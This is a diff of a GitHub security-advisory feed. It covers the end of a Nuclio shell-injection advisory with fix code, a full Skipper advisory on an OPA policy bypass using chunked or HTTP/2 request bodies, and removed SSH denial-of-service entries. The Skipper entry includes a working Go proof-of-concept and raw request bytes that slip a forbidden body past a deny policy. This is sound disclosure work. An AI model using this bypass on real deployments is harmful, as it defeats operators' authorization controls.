+<hr>
+<h2 id="resources">Resources</h2>
+<ul>
+<li>Vulnerable file: <code>pkg/platform/kube/functionres/lazy.go</code><ul>
+<li>Path-A: line 2150 — header key interpolation</li>
+<li>Path-B: lines 2188-2189 — body interpolation with <code>strconv.Quote</code></li>
+<li>Execution sink: line 2212 — <code>Args: []string{"/bin/sh", "-c", curlCommand}</code></li>
+</ul>
+</li>
+<li>Go <code>strconv.Quote</code> documentation: does not escape <code>$</code>, <code>(</code>, <code>)</code>, or backticks</li>
+<li>CWE-78: Improper Neutralization of Special Elements used in an OS Command</li>
+<li>CVSS 3.1 Calculator: <code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code></li>
+</ul>
+<hr>
+<h2 id="remediation">Remediation</h2>
+<p><strong>P0 — Eliminate the shell layer (preferred fix)</strong></p>
+<p>Replace the <code>/bin/sh -c &lt;string&gt;</code> invocation with an exec-format argument list. This
+removes shell interpretation entirely:</p>
+<pre><code class="language-go">// Current (vulnerable): lazy.go:2212
+Args: []string{"/bin/sh", "-c", curlCommand}
+
+// Fixed: build curl args as a []string slice
+func buildCurlArgs(headers map[string]string, body, address string) []string {
+    args := []string{"curl", "--silent"}
+    for k, v := range headers {
+        args = append(args, "--header", k+": "+v)
+    }
+    if body != "" {
+        args = append(args, "--data", body)
+    }
+    args = append(args, "--retry", "10", "--retry-delay", "1",
+        "--retry-max-time", "10", "--retry-connrefused", address)
+    return args
+}
+
+// Container spec:
+Container{
+    Command: nil,
+    Args:    buildCurlArgs(headersMap, eventBody, functionAddress),
+}
+</code></pre>
+<p>With exec format, each argument is passed directly to the process without shell
+interpretation. No quoting or escaping is needed.</p>
+<p><strong>P1 — Shell-safe quoting (fallback if shell is required)</strong></p>
+<p>If the shell invocation must be retained, apply proper POSIX shell quoting to all
+user-supplied values before interpolation. The equivalent of Python's <code>shlex.quote</code>
+must be implemented in Go:</p>
+<pre><code class="language-go">func shellQuote(s string) string {
+    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
+}
+</code></pre>
+<p>Apply to both <code>headerKey</code>, <code>headerValue</code>, and <code>eventBody</code> before inserting into the
+command string.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuclio/nuclio/security/advisories/GHSA-v5px-423j-pf7p">https://github.com/nuclio/nuclio/security/advisories/GHSA-v5px-423j-pf7p</a></li>
+<li><a href="https://github.com/nuclio/nuclio/commit/3356b86a8bfab3f960aa420310ebff765df9dede">https://github.com/nuclio/nuclio/commit/3356b86a8bfab3f960aa420310ebff765df9dede</a></li>
+<li><a href="https://github.com/nuclio/nuclio/releases/tag/1.16.4">https://github.com/nuclio/nuclio/releases/tag/1.16.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-v5px-423j-pf7p">https://github.com/advisories/GHSA-v5px-423j-pf7p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v5px-423j-pf7p</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-08T20:24:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zalando/skipper] Skipper: opaAuthorizeRequestWithBody filter bypasses OPA policy on Transfer-Encoding — chunked / HTTP/2 requests]]></title>
+        <id>https://github.com/advisories/GHSA-659f-rgp5-w4wf</id>
+        <link href="https://github.com/advisories/GHSA-659f-rgp5-w4wf"/>
+        <updated>2026-07-08T20:23:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>zalando/skipper</code>'s OpenPolicyAgent integration silently bypasses request-body
+inspection on HTTP/1.1 <code>Transfer-Encoding: chunked</code> and HTTP/2 requests that
+omit the <code>content-length</code> pseudo-header. When the
+<code>opaAuthorizeRequestWithBody</code> filter is configured, the
+<code>OpenPolicyAgentInstance.ExtractHttpBodyOptionally</code> helper produces an
+empty <code>raw_body</code> for any request whose <code>Content-Length</code> header is missing,
+while the underlying chunked body still flows through to the upstream
+service. Rego policies that gate on <code>input.parsed_body</code> (e.g. "deny when a
+forbidden field is present") evaluate against an empty document, treat the
+forbidden field as absent, and authorize the request. The upstream handler
+then receives the full attacker payload that the policy intended to block.</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p><code>github.com/zalando/skipper</code> versions <code>&lt;= v0.26.8</code> (the latest release on
+2026-05-26, current <code>master</code> <code>4eed47ff</code>). The vulnerable helper and gate
+have lived in <code>filters/openpolicyagent/openpolicyagent.go</code> since the
+buffered-body extractor was introduced; no released version contains the
+fix at the time of filing.</p>
+<h3 id="privilege-required">Privilege required</h3>
+<p>Unauthenticated network access to the skipper proxy listener. The threat
+model targets operators who place skipper in front of a private upstream
+and rely on <code>opaAuthorizeRequestWithBody</code> to enforce body-content checks
+(field allow/deny lists, payload schema gates, content-moderation flags,
+multi-tenant per-action authorization). Both HTTP/1.1 and HTTP/2 clients
+are affected; HTTP/2 traffic without a <code>content-length</code> pseudo-header is
+the dominant case because Go's <code>net/http</code> sets
+<code>http.Request.ContentLength = -1</code> for chunked HTTP/1.1 AND for HTTP/2
+requests whose framing carries the body as DATA frames without an explicit
+length header.</p>
+<h3 id="root-cause">Root cause</h3>
+<p><code>filters/openpolicyagent/openpolicyagent.go:1242-1269</code> (HEAD <code>4eed47ff</code>):</p>
+<pre><code class="language-go">func bodyUpperBound(contentLength, maxBodyBytes int64) int64 {
+    if contentLength &lt;= 0 {
+        return maxBodyBytes
+    }
+    if contentLength &lt; maxBodyBytes {
+        return contentLength
+    }
+    return maxBodyBytes
+}
+
+func (opa *OpenPolicyAgentInstance) ExtractHttpBodyOptionally(req *http.Request) (io.ReadCloser, []byte, func(), error) {
+    body := req.Body
+    if body != nil &amp;&amp; !opa.EnvoyPluginConfig().SkipRequestBodyParse &amp;&amp;
+        req.ContentLength &lt;= int64(opa.maxBodyBytes) {
+        wrapper := newBufferedBodyReader(req.Body, opa.maxBodyBytes, opa.bodyReadBufferSize)
+        requestedBodyBytes := bodyUpperBound(req.ContentLength, opa.maxBodyBytes)
+        if !opa.registry.maxMemoryBodyParsingSem.TryAcquire(requestedBodyBytes) {
+            return req.Body, nil, func() {}, ErrTotalBodyBytesExceeded
+        }
+        rawBody, err := wrapper.fillBuffer(req.ContentLength)
+        return wrapper, rawBody, func() { opa.registry.maxMemoryBodyParsingSem.Release(requestedBodyBytes) }, err
+    }
+    return req.Body, nil, func() {}, nil
+}
+</code></pre>
+<p><code>filters/openpolicyagent/openpolicyagent.go:1195-1210</code>:</p>
+<pre><code class="language-go">func (m *bufferedBodyReader) fillBuffer(expectedSize int64) ([]byte, error) {
+    var err error
+    for err == nil &amp;&amp; int64(m.bodyBuffer.Len()) &lt; m.maxBufferSize &amp;&amp; int64(m.bodyBuffer.Len()) &lt; expectedSize {
+        var n int
+        n, err = m.input.Read(m.readBuffer)
+        m.bodyBuffer.Write(m.readBuffer[:n])
+    }
+    if err == io.EOF { err = nil }
+    return m.bodyBuffer.Bytes(), err
+}
+</code></pre>
+<p>When the client sends <code>Transfer-Encoding: chunked</code> (HTTP/1.1) or an
+HTTP/2 request without <code>content-length</code>, Go's <code>net/http</code> server sets
+<code>req.ContentLength = -1</code>. The gate at line 1258 (<code>req.ContentLength &lt;= int64(opa.maxBodyBytes)</code>) is true (<code>-1 &lt;= positiveLimit</code>), so the body
+gets wrapped in <code>bufferedBodyReader</code>. <code>bodyUpperBound(-1, max)</code> returns
+<code>max</code>, so the memory semaphore is acquired, but <code>fillBuffer(-1)</code> then
+evaluates <code>int64(m.bodyBuffer.Len()) &lt; expectedSize</code> as <code>0 &lt; -1</code>, which
+is false on the first iteration. The loop never enters, the buffer stays
+empty, and the helper returns <code>[]byte{}</code> as <code>rawBody</code> to the caller.</p>
+<p>The caller in
+<code>filters/openpolicyagent/opaauthorizerequest/opaauthorizerequest.go:121</code>
+hands this empty slice to <code>envoy.AdaptToExtAuthRequest</code> which puts it
+into <code>AttributeContext.Request.Http.RawBody</code>. The OPA SDK then exposes
+the empty buffer as both <code>input.attributes.request.http.raw_body</code> and
+the parsed <code>input.parsed_body</code> document (the latter becomes an
+empty/undefined value). Any Rego rule that asserts the presence of a
+forbidden field in <code>input.parsed_body</code> evaluates to undefined and fails
+into the rule's default (typically <code>allow</code>).</p>
+<p>Meanwhile, the wrapped <code>body</code> returned to the filter (<code>req.Body = body</code>
+at line 127 of <code>opaauthorizerequest.go</code>) is a <code>bufferedBodyReader</code> whose
+<code>Read()</code> falls through to the underlying <code>m.input.Read(p)</code> when the
+buffer is empty (lines 1212-1228). The upstream handler therefore reads
+the full attacker payload that OPA was never given a chance to inspect.</p>
+<h3 id="reproduction-e2e-against-pinned-githubcomzalandoskipperv0268">Reproduction (E2E against pinned <code>github.com/zalando/skipper@v0.26.8</code>)</h3>
+<p>GHSA advisories have no file-attachment mechanism, so the complete
+<code>poc_test.go</code> source and the verbatim <code>go test</code> output are inlined below.</p>
+<p>The PoC is a Go test placed in
+<code>filters/openpolicyagent/opaauthorizerequest/poc_test.go</code> inside a checkout
+of the <code>v0.26.8</code> tag, so it links against the exact released source. It
+boots a real skipper proxy via <code>proxytest.New</code>, configures it with the
+<code>opaAuthorizeRequestWithBody</code> filter pointing at an in-process
+<code>opasdktest.MustNewServer</code> bundle server, installs a Rego policy that
+DENIES requests whose body contains <code>admin=true</code>, and adds a tiny upstream
+that records the body it actually received. It then drives the proxy over a
+raw TCP socket (<code>net.DialTimeout</code> + <code>http.ReadResponse</code>) to control the
+wire framing precisely, sending three requests.</p>
+<p><code>poc_test.go</code>:</p>
+<pre><code class="language-go">package opaauthorizerequest
+
+// PoC: opaAuthorizeRequestWithBody OPA-bypass on chunked / HTTP2 framing.
+//
+// The filter's body extractor (filters/openpolicyagent/openpolicyagent.go,
+// ExtractHttpBodyOptionally) gates on `req.ContentLength &lt;= maxBodyBytes`
+// and then calls fillBuffer(req.ContentLength). When the client sends the
+// body with Transfer-Encoding: chunked (HTTP/1.1) or via HTTP/2 without a
+// declared length, net/http sets req.ContentLength = -1. The gate passes
+// (-1 &lt;= max) but fillBuffer's loop condition `len(buf) &lt; expectedSize(-1)`
+// is immediately false, so the buffered body is EMPTY. OPA therefore sees an
+// empty input.parsed_body, a deny-policy that keys on the body fails open,
+// and the full attacker body is forwarded upstream.
+//
+// This test boots a real skipper proxy (proxytest) with the
+// opaAuthorizeRequestWithBody filter pointed at an in-process OPA bundle
+// server (opasdktest) hosting a deny-when-admin=true policy, plus a tiny
+// upstream that records the body it actually received. It then drives the
+// proxy over a raw TCP socket to control the wire framing precisely.
+
+import (
+    "bufio"
+    "fmt"
+    "io"
+    "net"
+    "net/http"
+    "net/http/httptest"
+    "strings"
+    "sync"
+    "testing"
+    "time"
+
+    opasdktest "github.com/open-policy-agent/opa/v1/sdk/test"
+    "github.com/zalando/skipper/eskip"
+    "github.com/zalando/skipper/filters"
+    "github.com/zalando/skipper/filters/builtin"
+    "github.com/zalando/skipper/proxy/proxytest"
+    "github.com/zalando/skipper/tracing/tracingtest"
+
+    "github.com/zalando/skipper/filters/openpolicyagent"
+)
+
+// rawRequest opens a fresh TCP connection to addr, writes wire verbatim, and
+// returns the parsed HTTP response.
+func rawRequest(t *testing.T, addr, wire string) *http.Response {
+    t.Helper()
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        t.Fatalf("dial %s: %v", addr, err)
+    }
+    defer conn.Close()
+    _ = conn.SetDeadline(time.Now().Add(10 * time.Second))
+
+    if _, err := io.WriteString(conn, wire); err != nil {
+        t.Fatalf("write wire: %v", err)
+    }
+
+    resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
+    if err != nil {
+        t.Fatalf("read response: %v", err)
+    }
+    // Drain so the body received by upstream is flushed before we inspect it.
+    _, _ = io.Copy(io.Discard, resp.Body)
+    _ = resp.Body.Close()
+    return resp
+}
+
+func TestSkipperOPABypassPoC(t *testing.T) {
+    // Upstream records, per request, the body bytes it actually received.
+    var mu sync.Mutex
+    var upstreamBodies []string
+    upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        b, _ := io.ReadAll(r.Body)
+        mu.Lock()
+        upstreamBodies = append(upstreamBodies, string(b))
+        mu.Unlock()
+        w.WriteHeader(http.StatusOK)
+        _, _ = w.Write([]byte("UPSTREAM-REACHED"))
+    }))
+    defer upstream.Close()
+
+    // OPA bundle: allow by default, deny only when the parsed body says admin==true.
+    opaControlPlane := opasdktest.MustNewServer(
+        opasdktest.MockBundle("/bundles/test", map[string]string{
+            "main.rego": `
+                package envoy.authz
+
+                import rego.v1
+
+                default allow := true
+
+                allow := false if {
+                    input.parsed_body.admin == true
+                }
+            `,
+        }),
+    )
+    defer opaControlPlane.Stop()
+
+    config := fmt.Appendf(nil, `{
+        "services": {
+            "test": {
+                "url": %q
+            }
+        },
+        "bundles": {
+            "test": {
+                "resource": "/bundles/{{ .bundlename }}"
+            }
+        },
+        "labels": {
+            "environment": "test"
+        },
+        "plugins": {
+            "envoy_ext_authz_grpc": {
+                "path": "envoy/authz/allow",
+                "dry-run": false
+            }
+        }
+    }`, opaControlPlane.URL())
+
+    opts := []func(*openpolicyagent.OpenPolicyAgentInstanceConfig) error{
+        openpolicyagent.WithConfigTemplate(config),
+    }
+
+    opaFactory, err := openpolicyagent.NewOpenPolicyAgentRegistry(
+        openpolicyagent.WithTracer(tracingtest.NewTracer()),
+        openpolicyagent.WithOpenPolicyAgentInstanceConfig(opts...),
+    )
+    if err != nil {
+        t.Fatalf("registry: %v", err)
+    }
+
+    fr := make(filters.Registry)
+    fr.Register(NewOpaAuthorizeRequestWithBodySpec(opaFactory))
+    fr.Register(builtin.NewSetPath())
+
+    // Route: every request runs opaAuthorizeRequestWithBody, then proxies to upstream.
+    r := eskip.MustParse(fmt.Sprintf(
+        `* -&gt; opaAuthorizeRequestWithBody("test") -&gt; "%s"`, upstream.URL))
+
+    proxy := proxytest.New(fr, r...)
+    defer proxy.Close()
+
+    host := strings.TrimPrefix(proxy.URL, "http://")
+
+    type tc struct {
+        name       string
+        wire       string
+        wantStatus int
+        wantUpstrm bool // whether upstream is expected to be reached
+    }
+
+    cases := []tc{
+        {
+            name: "1: Content-Length benign body -&gt; 200 ALLOW",
+            wire: "POST /priv HTTP/1.1\r\n" +
+                "Host: " + host + "\r\n" +
+                "Content-Type: application/json\r\n" +
+                "Connection: close\r\n" +
+                "Content-Length: 15\r\n" +
+                "\r\n" +
+                `{"admin":false}`,
+            wantStatus: 200,
+            wantUpstrm: true,
+        },
+        {
+            name: "2: Content-Length admin body -&gt; 403 DENY (negative control)",
+            wire: "POST /priv HTTP/1.1\r\n" +
+                "Host: " + host + "\r\n" +
+                "Content-Type: application/json\r\n" +
+                "Connection: close\r\n" +
+                "Content-Length: 14\r\n" +
+                "\r\n" +
+                `{"admin":true}`,
+            wantStatus: 403,
+            wantUpstrm: false,
+        },
+        {
+            name: "3: chunked admin body -&gt; EXPECTED 403, BUG 200 (bypass)",
+            wire: "POST /priv HTTP/1.1\r\n" +
+                "Host: " + host + "\r\n" +
+                "Content-Type: application/json\r\n" +
+                "Connection: close\r\n" +
+                "Transfer-Encoding: chunked\r\n" +
+                "\r\n" +
+                "e\r\n" +
+                `{"admin":true}` + "\r\n" +
+                "0\r\n" +
+                "\r\n",
+            wantStatus: 200, // documents the BUG: should be 403 but the bypass yields 200
+            wantUpstrm: true,
+        },
+    }
+
+    for _, c := range cases {
+        mu.Lock()
+        before := len(upstreamBodies)
+        mu.Unlock()
+
+        resp := rawRequest(t, host, c.wire)
+
+        mu.Lock()
+        reached := len(upstreamBodies) &gt; before
+        var lastBody string
+        if reached {
+            lastBody = upstreamBodies[len(upstreamBodies)-1]
+        }
+        mu.Unlock()
+
+        t.Logf("[%s] status=%d upstreamReached=%v upstreamBody=%q",
+            c.name, resp.StatusCode, reached, lastBody)
+
+        if resp.StatusCode != c.wantStatus {
+            t.Errorf("[%s] status = %d, want %d", c.name, resp.StatusCode, c.wantStatus)
+        }
+        if reached != c.wantUpstrm {
+            t.Errorf("[%s] upstreamReached = %v, want %v", c.name, reached, c.wantUpstrm)
+        }
+    }
+
+    // Explicit bypass assertion: the chunked admin body MUST have reached
+    // upstream verbatim despite the deny policy.
+    mu.Lock()
+    defer mu.Unlock()
+    bypassed := false
+    for _, b := range upstreamBodies {
+        if b == `{"admin":true}` {
+            bypassed = true
+        }
+    }
+    if bypassed {
+        t.Logf("BYPASS CONFIRMED: upstream received {\"admin\":true} despite deny policy (OPA saw empty parsed_body for the chunked request)")
+    } else {
+        t.Errorf("expected the chunked admin body to reach upstream (bypass), but it did not")
+    }
+}
+</code></pre>
+<p>The three requests cover:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Wire framing</th>
+<th>Body</th>
+<th>Expected</th>
+<th>Got</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>Content-Length: 15</code></td>
+<td><code>{"admin":false}</code></td>
+<td>200 ALLOW</td>
+<td>200 (upstream reached)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>Content-Length: 14</code></td>
+<td><code>{"admin":true}</code></td>
+<td>403 DENY</td>
+<td>403 (OPA blocked)</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>Transfer-Encoding: chunked</code></td>
+<td><code>{"admin":true}</code></td>
+<td>403 DENY</td>
+<td><strong>200 ALLOW (bypass)</strong></td>
+</tr>
+</tbody></table>
+<p>Test 3 wire bytes: <code>POST /priv HTTP/1.1\r\nHost: ...\r\nContent-Type: application/json\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\ne\r\n{"admin":true}\r\n0\r\n\r\n</code>.</p>
+<p>Run command and verbatim output (<code>go version go1.26.3 darwin/arm64</code>,
+<code>github.com/open-policy-agent/opa v1.14.1</code> as pinned by skipper <code>v0.26.8</code>):</p>
+<pre><code>$ go test -v -run TestSkipperOPABypassPoC -count=1 ./filters/openpolicyagent/opaauthorizerequest/
+=== RUN   TestSkipperOPABypassPoC
+2026/05/28 14:43:47 route settings, reset, route: : * -&gt; opaAuthorizeRequestWithBody("test") -&gt; "http://127.0.0.1:57343"
+2026/05/28 14:43:47 route settings received, id: 1
+time="2026-05-28T14:43:47+08:00" level=info msg="Starting OPA instance..." bundle-name=test
+time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=false status=map[bundle:{NOT_READY \"\"} discovery:{NOT_READY \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
+time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=false status=map[bundle:{NOT_READY \"\"} discovery:{OK \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
+time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=true status=map[bundle:{OK \"\"} discovery:{OK \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
+2026/05/28 14:43:47 route settings applied, id: 1
+    poc_test.go:211: [1: Content-Length benign body -&gt; 200 ALLOW] status=200 upstreamReached=true upstreamBody="{\"admin\":false}"
+    poc_test.go:211: [2: Content-Length admin body -&gt; 403 DENY (negative control)] status=403 upstreamReached=false upstreamBody=""
+    poc_test.go:211: [3: chunked admin body -&gt; EXPECTED 403, BUG 200 (bypass)] status=200 upstreamReached=true upstreamBody="{\"admin\":true}"
+    poc_test.go:233: BYPASS CONFIRMED: upstream received {"admin":true} despite deny policy (OPA saw empty parsed_body for the chunked request)
+--- PASS: TestSkipperOPABypassPoC (0.11s)
+PASS
+ok  	github.com/zalando/skipper/filters/openpolicyagent/opaauthorizerequest	1.897s
+</code></pre>
+<p>Test 1 (Content-Length, benign body) is allowed and reaches upstream with
+<code>{"admin":false}</code>. Test 2 is the negative control: the same <code>{"admin":true}</code>
+payload sent with a <code>Content-Length</code> header is correctly DENIED (HTTP 403)
+and never reaches the upstream, proving the policy itself is sound. Test 3
+sends the identical forbidden body as <code>Transfer-Encoding: chunked</code>; OPA
+evaluates an empty <code>parsed_body</code>, the deny rule fails open, the proxy
+returns HTTP 200, and the upstream receives the full <code>{"admin":true}</code>
+payload that the policy was configured to block.</p>
+<h3 id="impact">Impact</h3>
+<p>Operators relying on <code>opaAuthorizeRequestWithBody</code> for body-content
+authorization are silently downgraded to header/path-only authorization
+for any client that emits chunked or HTTP/2 requests. Concrete
+production patterns affected:</p>
+<ul>
+<li>"Deny when body contains admin/privileged field" guardrails for
+multi-tenant or role-stratified APIs;</li>
+<li>"Deny when content-moderation flag is present" filters in front of
+user-content endpoints;</li>
+<li>"Deny when payload schema version is forbidden" gates for
+deprecated-API shutdown;</li>
+<li>"Deny when SQL/command-injection-shaped string is present" generic
+body validators.</li>
+</ul>
+<p>In every case the chunked attack arrives with the forbidden body
+intact, OPA evaluates against an empty document, the policy fails open,
+and the upstream receives the attacker payload that the deployment was
+specifically configured to block. There is no log signal in OPA's
+decision log distinguishing "body was empty" from "client did not send
+a body".</p>
+<p>Note that the OPA decision log will record the request as ALLOWED with
+<code>raw_body</code> length 0, which complicates post-hoc forensic detection. The
+upstream's request log will show the full body, producing a confusing
+allow/observed asymmetry across systems.</p>
+<p>CVSS 3.1: <code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N</code> (8.5 HIGH). Scope is
+Changed because the failure crosses the trust boundary between the
+authorization filter and the upstream service.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p><code>filters/openpolicyagent/openpolicyagent.go</code>:</p>
+<pre><code class="language-diff"> func (opa *OpenPolicyAgentInstance) ExtractHttpBodyOptionally(req *http.Request) (io.ReadCloser, []byte, func(), error) {
+     body := req.Body
+ 
++	// `req.ContentLength == -1` is set by net/http when the client uses
++	// Transfer-Encoding: chunked (HTTP/1.1) or omits content-length in
++	// HTTP/2 framing. Treat unknown-length bodies as up-to-max-bytes and
++	// drive fillBuffer with the policy cap instead of the negative
++	// sentinel, otherwise the fillBuffer loop short-circuits on its
++	// `len &lt; expectedSize` predicate and OPA evaluates an empty body.
++	expectedSize := req.ContentLength
++	if expectedSize &lt; 0 {
++		expectedSize = opa.maxBodyBytes
++	}
++
+     if body != nil &amp;&amp; !opa.EnvoyPluginConfig().SkipRequestBodyParse &amp;&amp;
+-		req.ContentLength &lt;= int64(opa.maxBodyBytes) {
++		expectedSize &lt;= int64(opa.maxBodyBytes) {
+ 
+         wrapper := newBufferedBodyReader(req.Body, opa.maxBodyBytes, opa.bodyReadBufferSize)
+ 
+-		requestedBodyBytes := bodyUpperBound(req.ContentLength, opa.maxBodyBytes)
++		requestedBodyBytes := bodyUpperBound(expectedSize, opa.maxBodyBytes)
+         if !opa.registry.maxMemoryBodyParsingSem.TryAcquire(requestedBodyBytes) {
+             return req.Body, nil, func() {}, ErrTotalBodyBytesExceeded
+         }
+ 
+-		rawBody, err := wrapper.fillBuffer(req.ContentLength)
++		rawBody, err := wrapper.fillBuffer(expectedSize)
+         return wrapper, rawBody, func() { opa.registry.maxMemoryBodyParsingSem.Release(requestedBodyBytes) }, err
+     }
+ 
+     return req.Body, nil, func() {}, nil
+ }
+</code></pre>
+<p>After the fix, <code>fillBuffer(maxBodyBytes)</code> reads chunked bodies up to
+the configured cap. If the body exceeds the cap, the existing <code>Read()</code>
+path already returns the wrapped reader for downstream consumption,
+matching the documented behaviour for over-cap requests today; the
+operator-configured <code>maxRequestBodyBytes</code> continues to be the single
+knob governing memory allocation.</p>
+<p>A regression test <code>TestOpaAuthorizeRequestWithBody_ChunkedBodyIsParsed</code>
+in <code>filters/openpolicyagent/opaauthorizerequest/opaauthorizerequest_test.go</code>
+should send a <code>Transfer-Encoding: chunked</code> request matching a
+blacklist policy and assert HTTP 403, and a same-payload Content-Length
+request to confirm parity.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zalando/skipper/security/advisories/GHSA-659f-rgp5-w4wf">https://github.com/zalando/skipper/security/advisories/GHSA-659f-rgp5-w4wf</a></li>
+<li><a href="https://github.com/advisories/GHSA-659f-rgp5-w4wf">https://github.com/advisories/GHSA-659f-rgp5-w4wf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-659f-rgp5-w4wf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-08T20:23:44.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/quay/claircore] Claircore: Unauthenticated attackers can submit manifests with URIs pointing to internal services or cloud metadata endpoints]]></title>
         <id>https://github.com/advisories/GHSA-698x-9w2p-7vvp</id>
@@ -1296,98 +2442,5 @@ ok  	github.com/zxh326/kite/pkg/system	0.711s
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-25T22:18:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto] golang.org/x/crypto: Invoking client can cause server deadlock on unexpected responses]]></title>
-        <id>https://github.com/advisories/GHSA-vgwf-h737-ff37</id>
-        <link href="https://github.com/advisories/GHSA-vgwf-h737-ff37"/>
-        <updated>2026-07-08T15:31:31.000Z</updated>
-        <content type="html"><![CDATA[<p>A malicious SSH peer could send unsolicited global request responses to fill an internal buffer, blocking the connection's read loop. The blocked goroutine could not be released by calling Close(), resulting in a resource leak per connection. Unsolicited global responses are now discarded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39830">https://nvd.nist.gov/vuln/detail/CVE-2026-39830</a></li>
-<li><a href="https://go.dev/cl/781640">https://go.dev/cl/781640</a></li>
-<li><a href="https://go.dev/cl/781664">https://go.dev/cl/781664</a></li>
-<li><a href="https://go.dev/issue/79564">https://go.dev/issue/79564</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5017">https://pkg.go.dev/vuln/GO-2026-5017</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:29455">https://access.redhat.com/errata/RHSA-2026:29455</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-39830">https://access.redhat.com/security/cve/CVE-2026-39830</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2480684">https://bugzilla.redhat.com/show_bug.cgi?id=2480684</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39830.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39830.json</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:35833">https://access.redhat.com/errata/RHSA-2026:35833</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36199">https://access.redhat.com/errata/RHSA-2026:36199</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36207">https://access.redhat.com/errata/RHSA-2026:36207</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36319">https://access.redhat.com/errata/RHSA-2026:36319</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36625">https://access.redhat.com/errata/RHSA-2026:36625</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36648">https://access.redhat.com/errata/RHSA-2026:36648</a></li>
-<li><a href="https://github.com/advisories/GHSA-vgwf-h737-ff37">https://github.com/advisories/GHSA-vgwf-h737-ff37</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vgwf-h737-ff37</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:18:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto] golang.org/x/crypto: Invoking memory leak when rejecting channels can lead to DoS]]></title>
-        <id>https://github.com/advisories/GHSA-qpw4-5x99-6vjp</id>
-        <link href="https://github.com/advisories/GHSA-qpw4-5x99-6vjp"/>
-        <updated>2026-07-07T15:24:36.000Z</updated>
-        <content type="html"><![CDATA[<p>An authenticated SSH client that repeatedly opened channels which were rejected by the server caused unbounded memory growth, eventually crashing the server process and affecting all connected users. Rejected channels are now properly removed from the connection's internal state and released for garbage collection.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39827">https://nvd.nist.gov/vuln/detail/CVE-2026-39827</a></li>
-<li><a href="https://go.dev/cl/781320">https://go.dev/cl/781320</a></li>
-<li><a href="https://go.dev/issue/35127">https://go.dev/issue/35127</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5016">https://pkg.go.dev/vuln/GO-2026-5016</a></li>
-<li><a href="https://github.com/advisories/GHSA-qpw4-5x99-6vjp">https://github.com/advisories/GHSA-qpw4-5x99-6vjp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qpw4-5x99-6vjp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:15:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto] golang.org/x/crypto is vulnerable to invoking server panic during CheckHostKey/Authenticate flow]]></title>
-        <id>https://github.com/advisories/GHSA-78mq-xcr3-xm33</id>
